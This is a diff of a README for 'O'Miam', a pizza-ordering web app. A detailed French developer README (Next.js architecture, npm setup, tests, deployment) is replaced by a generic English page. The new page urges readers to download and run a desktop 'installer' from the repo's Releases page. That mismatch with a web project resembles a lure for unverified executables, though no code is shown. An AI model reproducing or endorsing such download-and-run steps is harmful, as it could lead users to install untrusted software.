@@ -1,231 +1,61 @@
-# 🍕 O'Miam - Plateforme Moderne de Commande de Pizzas
+# 🍕 omiam-pizza-platform - Order Pizza with Ease
 
-[![Next.js](https://img.shields.io/badge/Next.js-14-black?style=for-the-badge&logo=next.js)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-blue?style=for-the-badge&logo=typescript)](https://www.typescriptlang.org/)
-[![Supabase](https://img.shields.io/badge/Supabase-Database-green?style=for-the-badge&logo=supabase)](https://supabase.com/)
-[![Stripe](https://img.shields.io/badge/Stripe-Payments-purple?style=for-the-badge&logo=stripe)](https://stripe.com/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-CSS-38B2AC?style=for-the-badge&logo=tailwind-css)](https://tailwindcss.com/)
+## 🌟 Description
+O'Miam is a user-friendly pizza ordering platform that simplifies your pizza cravings. With features like advanced optimizations, it offers a smooth experience for ordering delicious pizzas from your favorite restaurants.
 
-## 🚀 Vue d'Ensemble
+## 📥 Download Now
+[![Download O'Miam](https://img.shields.io/badge/Download%20O%27Miam-blue.svg)](https://github.com/Luxvanlubis/omiam-pizza-platform/releases)
 
-O'Miam est une plateforme web moderne et complète pour la commande de pizzas en ligne, développée avec les dernières technologies web. Elle offre une expérience utilisateur exceptionnelle avec des fonctionnalités avancées d'e-commerce, de gestion de restaurant et d'optimisations de performance.
+## 🚀 Getting Started
+Follow these steps to get started with O'Miam:
 
-## ✨ Fonctionnalités
+1. **Visit the Download Page**  
+   Click on the link below to access our Releases page:  
+   [Download O'Miam](https://github.com/Luxvanlubis/omiam-pizza-platform/releases)
 
-### 🛍️ E-commerce Core
-- **Catalogue produits** avec recherche et filtres avancés
-- **Panier d'achat** avec gestion d'état persistante
-- **Système d'authentification** sécurisé avec NextAuth.js
-- **Gestion des commandes** et historique utilisateur
-- **Interface responsive** optimisée mobile-first
+2. **Choose Your Version**  
+   On the Releases page, you will see different versions of O'Miam. Look for the latest version, as it includes the newest features and improvements.
 
-### 🔒 Sécurité & Performance
-- **Headers de sécurité** (CSP, HSTS, X-Frame-Options)
-- **Rate limiting** sur les APIs
-- **Validation des données** avec Zod
-- **Error boundaries** React pour la résilience
-- **Logging structuré** pour le monitoring
-- **Health checks** pour la surveillance
+3. **Download the Installer**  
+   Click on the version you want, and look for the download link that matches your operating system. For example, if you see a link for Windows, click it to start the download.
 
-### 🧪 Qualité & Tests
-- **Tests unitaires** avec Jest et React Testing Library
-- **Tests E2E** avec Playwright
-- **Analyse de performance** avec Lighthouse
-- **CI/CD** avec GitHub Actions
-- **Scan de sécurité** automatisé
+4. **Run the Installer**  
+   Once the download is complete, find the downloaded file in your downloads folder. Double-click the file to start the installation process. Follow the prompts to complete the installation.
 
-## 🏗️ Architecture
+5. **Launch O'Miam**  
+   After installation, look for the O'Miam app on your device. Double-click the icon to open the app and start ordering your favorite pizzas.
 
-```
-src/
-├── app/                    # App Router (Next.js 14)
-│   ├── api/               # API Routes
-│   │   ├── auth/          # Authentication endpoints
-│   │   ├── products/      # Product management
-│   │   ├── orders/        # Order processing
-│   │   └── health/        # Health check endpoint
-│   ├── (auth)/           # Authentication pages
-│   ├── products/         # Product pages
-│   └── layout.tsx        # Root layout with providers
-├── components/            # Composants réutilisables
-│   ├── ui/               # Composants UI de base
-│   ├── forms/            # Formulaires
-│   ├── layout/           # Composants de mise en page
-│   └── __tests__/        # Tests unitaires
-├── lib/                  # Utilitaires et configurations
-│   ├── auth.ts          # Configuration NextAuth
-│   ├── db.ts            # Configuration base de données
-│   ├── validations.ts   # Schémas Zod
-│   └── utils.ts         # Fonctions utilitaires
-├── hooks/               # Custom React hooks
-├── store/              # Gestion d'état (Zustand)
-└── types/              # Définitions TypeScript
-```
+## 📚 Features
+O'Miam offers a variety of features to enhance your pizza ordering experience:
 
-## 🚀 Démarrage Rapide
+- **Progressive Web App (PWA)**: Access the platform from any device without downloading it directly from the app store.
+- **Search Engine Optimization (SEO)**: Find pizzas quickly through an optimized search feature.
+- **Integrated Analytics**: Track your orders and preferences for a better experience.
+- **Safety and Security**: Enjoy secure transactions and protect your personal information.
+  
+## ✅ System Requirements
+O'Miam is designed to run smoothly on modern devices. Here are the recommended system requirements:
 
-### Prérequis
-- Node.js 18+ 
-- npm ou yarn
-- Base de données (PostgreSQL recommandé)
+- **Operating System**: Windows 10, macOS 10.15 or later, or any modern Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 500 MB of free disk space.
+- **Internet Connection**: Required for browsing and ordering.
 
-### Installation
+## 🎨 Design
+O'Miam uses Tailwind CSS, ensuring a beautiful and responsive design. The platform looks great on any screen size, whether you’re on a computer, tablet, or phone.
 
-```bash
-# Cloner le repository
-git clone <repository-url>
-cd nextjs-ecommerce
+## 💳 Payment Options
+We support various payment methods, including Stripe, which offers a secure payment process. You can confidently complete your orders without worries.
 
-# Installer les dépendances
-npm install
+## 🛠 Support
+Need help? We’re here for you. You can reach our support team via email at support@omiam.com or check our FAQ section on the main website for common questions.
 
-# Configurer les variables d'environnement
-cp .env.example .env.local
-# Éditer .env.local avec vos configurations
+## 🔗 Useful Links
+- **Releases Page**: [Download O'Miam](https://github.com/Luxvanlubis/omiam-pizza-platform/releases)
+- **Documentation**: For detailed usage instructions, visit our [documentation page](https://github.com/Luxvanlubis/omiam-pizza-platform/wiki).
 
-# Initialiser la base de données
-npm run db:push
-npm run db:generate
+## 📬 Feedback
+Your feedback is important to us. If you have suggestions or comments, please get in touch. We value your opinion and work hard to improve O'Miam.
 
-# Démarrer en mode développement
-npm run dev
-```
-
-Ouvrez [http://localhost:3000](http://localhost:3000) dans votre navigateur pour voir l'application.
-
-### Variables d'Environnement
-
-```env
-# Base de données
-DATABASE_URL="postgresql://..."
-
-# Authentication
-NEXTAUTH_URL="http://localhost:3000"
-NEXTAUTH_SECRET="your-secret-key"
-
-# Providers OAuth (optionnel)
-GOOGLE_CLIENT_ID="..."
-GOOGLE_CLIENT_SECRET="..."
-GITHUB_CLIENT_ID="..."
-GITHUB_CLIENT_SECRET="..."
-
-# Monitoring (optionnel)
-SENTRY_DSN="..."
-```
-
-## 🧪 Tests
-
-### Tests Unitaires
-```bash
-# Exécuter tous les tests
-npm test
-
-# Mode watch
-npm run test:watch
-
-# Avec couverture
-npm run test:coverage
-```
-
-### Tests E2E
-```bash
-# Installer Playwright
-npx playwright install
-
-# Exécuter les tests E2E
-npm run test:e2e
-
-# Mode interactif
-npm run test:e2e:ui
-```
-
-## 🔧 Scripts Disponibles
-
-| Script | Description |
-|--------|-------------|
-| `npm run dev` | Démarrage en mode développement |
-| `npm run build` | Build de production |
-| `npm run start` | Démarrage du serveur de production |
-| `npm run lint` | Linting avec ESLint |
-| `npm test` | Tests unitaires |
-| `npm run test:e2e` | Tests end-to-end |
-| `npm run db:push` | Synchroniser le schéma DB |
-| `npm run db:generate` | Générer le client Prisma |
-
-## 📊 Monitoring & Observabilité
-
-### Health Checks
-- **Endpoint**: `GET /api/health`
-- **Métriques**: Status DB, mémoire, uptime
-- **Format**: JSON avec codes de statut HTTP appropriés
-
-### Logging
-- **Structured logging** avec Winston/Pino
-- **Niveaux**: error, warn, info, debug
-- **Contexte**: Request ID, User ID, timestamps
-
-### Error Tracking
-- **Error Boundaries** React pour capturer les erreurs UI
-- **API Error Handling** centralisé
-- **Integration Sentry** pour le monitoring en production
-
-## 🔒 Sécurité
-
-### Headers de Sécurité
-- **Content Security Policy (CSP)**
-- **HTTP Strict Transport Security (HSTS)**
-- **X-Frame-Options**: Protection contre le clickjacking
-- **X-Content-Type-Options**: Protection MIME sniffing
-
-### Rate Limiting
-- **API Protection**: 100 req/15min par IP
-- **Auth endpoints**: 5 req/15min par IP
-- **Bypass pour les IPs whitelistées**
-
-### Validation des Données
-- **Zod schemas** pour toutes les entrées
-- **Sanitization** automatique
-- **Type safety** end-to-end
-
-## 🚀 Déploiement
-
-### Vercel (Recommandé)
-```bash
-# Installer Vercel CLI
-npm i -g vercel
-
-# Déployer
-vercel --prod
-```
-
-### Docker
-```bash
-# Build l'image
-docker build -t nextjs-ecommerce .
-
-# Exécuter le container
-docker run -p 3000:3000 nextjs-ecommerce
-```
-
-## 🤝 Contribution
-
-### Workflow de Développement
-1. **Fork** le repository
-2. **Créer une branche** feature (`git checkout -b feature/amazing-feature`)
-3. **Commit** les changements (`git commit -m 'Add amazing feature'`)
-4. **Push** vers la branche (`git push origin feature/amazing-feature`)
-5. **Ouvrir une Pull Request**
-
-### Standards de Code
-- **ESLint + Prettier** pour le formatage
-- **Conventional Commits** pour les messages
-- **Tests requis** pour les nouvelles fonctionnalités
-- **Documentation** mise à jour
-
-## 📄 License
-
-MIT License - voir le fichier [LICENSE](LICENSE) pour plus de détails.
-
----
-
-**Développé avec ❤️ et les meilleures pratiques de sécurité et performance.**
+## 🎉 Thank You
+Thank you for choosing O'Miam. We hope you enjoy ordering your favorite pizzas as much as we enjoyed creating this platform for you. Happy ordering!
